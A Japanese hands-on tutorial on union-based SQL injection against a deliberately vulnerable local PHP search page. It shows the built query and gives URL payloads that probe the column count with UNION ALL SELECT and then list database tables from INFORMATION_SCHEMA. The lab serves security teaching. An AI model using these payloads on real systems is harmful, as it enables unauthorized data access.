# Union-Based SQL Injection

## アプリケーション理解

http://localhost:8080/search.php にアクセスするとユーザー一覧が表示されます。

また検索フォームから、ユーザーの検索も可能です。

## ソースコード理解

このページのソースコードは [search.php](https://github.com/sanopy/sqli-handson/blob/main/src/search.php) から確認可能です。

また、ソースコードを詳しく調べると、 [SQLのクエリを構築する部分](https://github.com/sanopy/sqli-handson/blob/56a474a59028ed45aef3af34d99f867158063a5e/src/search.php#L8) にSQLインジェクションの脆弱性が存在することが分かります。

### 発行されるSQLクエリを観察

first_name: `alan` を入力したときは、以下のようなクエリが発行されます。

```sql
SELECT * FROM users WHERE username LIKE '%%' AND email LIKE '%%' AND first_name LIKE '%alan%' AND last_name LIKE '%%'
```

## カラム数を特定

[UNION句](https://dev.mysql.com/doc/refman/5.6/ja/union.html) を利用することで、SELECT文によるテーブルの取得結果を統合することが可能です。
つまり、UNION句が埋め込まれたクエリを実行させることで、DB中の任意の値を取得することが可能となります。

ただし、UNION句によってSELECT文の結果を統合する場合には、統合する取得結果同士でカラム数が同一である必要があります。

ソースコードが入手可能な場合には、発行されるクエリが取得するカラム数を特定することが可能ですが、そうでない場合には以下のように、SQLが正しく評価されるまで、UNION句によって結合するテーブルのカラム数を1つずつ増やしながら、カラム数を探索する方法があります。

- http://localhost:8080/search.php?email=%27+UNION+ALL+SELECT+1+--+
- http://localhost:8080/search.php?email=%27+UNION+ALL+SELECT+1%2C+1+--+
- ...
- http://localhost:8080/search.php?email=%27+UNION+ALL+SELECT+1%2C+1%2C+1%2C+1%2C+1%2C+1%2C+1+--+

## データベース情報を取得

MySQLには [INFORMATION_SCHEMA](https://dev.mysql.com/doc/refman/5.6/ja/information-schema.html) というデータベース中のメタデータが取得可能なテーブルが存在します。
以下は、 [INFORMATION_SCHEMA.TABLES](https://dev.mysql.com/doc/refman/5.6/ja/information-schema-tables-table.html) を用いて、データベース中のテーブル一覧を取得する例になります。

http://localhost:8080/search.php?username=xx&email=%27+UNION+ALL+SELECT+1%2C+TABLE_SCHEMA%2C+1%2C+TABLE_NAME%2C+TABLE_TYPE%2C+ENGINE%2C+1+FROM+INFORMATION_SCHEMA.TABLES+--+